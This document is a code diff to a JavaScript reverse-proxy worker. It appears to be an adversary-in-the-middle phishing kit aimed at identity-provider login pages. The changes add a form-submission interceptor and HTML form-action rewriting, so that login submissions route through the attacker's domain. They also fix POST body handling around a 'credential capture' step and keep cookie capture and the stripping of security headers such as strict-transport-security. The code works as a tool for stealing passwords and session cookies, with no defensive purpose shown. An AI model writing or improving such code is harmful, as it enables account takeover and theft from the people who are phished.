@@ -337,6 +337,20 @@ function generateInterceptorScript(upstreamDomain) {
       }
     }
     
+    // CRITICAL: Intercept form submissions to ensure they go through proxy
+    document.addEventListener('submit', function(e) {
+      const form = e.target;
+      if (form.action && !form.action.includes(YOUR_DOMAIN + PROXY_PREFIX)) {
+        try {
+          const actionUrl = new URL(form.action);
+          if (shouldProxyDomain(actionUrl.hostname)) {
+            form.action = rewriteUrl(form.action);
+            console.log('[Proxy] Rewrote form action to:', form.action);
+          }
+        } catch(err) {}
+      }
+    }, true);
+    
     console.log('[Proxy Interceptor] Active for upstream:', CURRENT_UPSTREAM);
   } catch(err) {
     console.error('[Proxy Interceptor] Failed to initialize:', err);
@@ -386,10 +400,14 @@ export default async function handleRequest(request) {
   headers.delete('x-forwarded-host');
   headers.delete('x-forwarded-proto');
 
-  // Store body text for credential capture, but preserve original body for upstream
+  // CRITICAL FIX: For POST requests, we need to handle the body carefully
+  // Clone the request first for credential capture, then use original for upstream
   let bodyText = null;
+  let requestBody = null;
+  
   if (request.method === 'POST') {
     try {
+      // Clone for credential capture
       const clonedRequest = request.clone();
       bodyText = await clonedRequest.text();
       
@@ -420,8 +438,14 @@ export default async function handleRequest(request) {
           body: formData,
         });
       }
+      
+      // CRITICAL: Recreate the body from the captured text since the original stream is consumed
+      requestBody = new TextEncoder().encode(bodyText);
+      
     } catch (error) {
       console.error('Credential capture error:', error);
+      // If cloning failed, try to use original body
+      requestBody = request.body;
     }
   }
   
@@ -432,9 +456,10 @@ export default async function handleRequest(request) {
       redirect: 'manual'
     };
     
+    // CRITICAL FIX: Properly handle request body for POST/PUT/PATCH
     if (!['GET', 'HEAD'].includes(request.method)) {
-      // Use the original request's body stream, not the consumed clone
-      fetchOpts.body = request.body;
+      // Use the recreated body if we have it, otherwise use original
+      fetchOpts.body = requestBody || request.body;
       fetchOpts.duplex = 'half';
     }
     
@@ -465,7 +490,7 @@ export default async function handleRequest(request) {
     newHeaders.delete('clear-site-data');
     newHeaders.delete('strict-transport-security');
     
-    // Handle cookies - FIXED: Add Secure flag when using SameSite=None
+    // Handle cookies
     const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
     let shouldCaptureCookies = false;
     let cookieStr = '';
@@ -481,7 +506,6 @@ export default async function handleRequest(request) {
         let mod = c.replace(/Domain=[^;]+;?/gi, '');
         mod = mod.replace(/Secure;?/gi, '');
         mod = mod.replace(/SameSite=[^;]+;?/gi, '');
-        // FIXED: SameSite=None requires Secure flag in modern browsers
         mod += '; SameSite=None; Secure';
         newHeaders.append('Set-Cookie', mod);
       });
@@ -516,7 +540,6 @@ export default async function handleRequest(request) {
       // Rewrite all absolute URLs for known domains (CSS, JS, HTML)
       Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
         const escaped = domain.replace(/\./g, '\\.');
-        // Match http:// or https:// followed by the domain
         const regex = new RegExp('https?://' + escaped + '([^"\'`\\s)]*)', 'g');
         text = text.replace(regex, 'https://' + YOUR_DOMAIN + PROXY_PREFIX + domain + '$1');
       });
@@ -535,6 +558,20 @@ export default async function handleRequest(request) {
       // Handle relative URLs in CSS that start with /
       if (ct.includes('text/css')) {
         text = text.replace(/url\(["']?\/([^"')]+)["']?\)/g, 'url(https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + '/$1)');
+      }
+      
+      // CRITICAL: Rewrite form actions in HTML to ensure they go through proxy
+      if (ct.includes('text/html')) {
+        // Rewrite any remaining absolute URLs that might have been missed
+        text = text.replace(/action=["'](https?:\/\/[^"']+)["']/gi, (match, url) => {
+          try {
+            const urlObj = new URL(url);
+            if (shouldProxyDomain(urlObj.hostname)) {
+              return 'action="' + rewriteLocation(url) + '"';
+            }
+          } catch(e) {}
+          return match;
+        });
       }
       
       return new Response(text, { status: resp.status, headers: newHeaders });
